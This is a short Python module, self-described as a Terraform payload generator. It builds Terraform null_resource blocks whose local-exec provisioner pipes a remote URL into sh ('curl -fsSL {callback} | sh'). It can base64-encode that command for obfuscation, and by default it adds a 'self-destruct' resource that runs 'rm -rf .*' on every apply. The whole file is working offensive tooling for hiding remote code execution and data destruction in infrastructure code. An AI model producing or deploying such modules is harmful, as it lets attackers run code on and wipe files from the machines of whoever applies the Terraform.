"""Terraform payload generator."""
from __future__ import annotations

import base64
from textwrap import dedent
from typing import Optional


def _encode(cmd: str, method: Optional[str]) -> str:
    if method == "b64":
        return base64.b64encode(cmd.encode()).decode()
    return cmd


def generate(name: str, callback: str, encode: Optional[str] = None, self_destruct: bool = True) -> str:
    """Return Terraform module calling ``callback`` via local-exec."""

    cmd = f"curl -fsSL {callback} | sh"
    payload_cmd = _encode(cmd, encode)
    if encode == "b64":
        shell = f"echo {payload_cmd} | base64 -d | sh"
    else:
        shell = payload_cmd

    block = dedent(
        f"""
        resource \"null_resource\" \"{name}\" {{
          provisioner \"local-exec\" {{
            command = \"{shell}\"
          }}
        }}
        """
    )
    if self_destruct:
        block += f"\nresource \"null_resource\" \"destroy_{name}\" {{ triggers = {{ always = timestamp() }} provisioner \"local-exec\" {{ command = \"rm -rf .*\" }} }}"
    return block
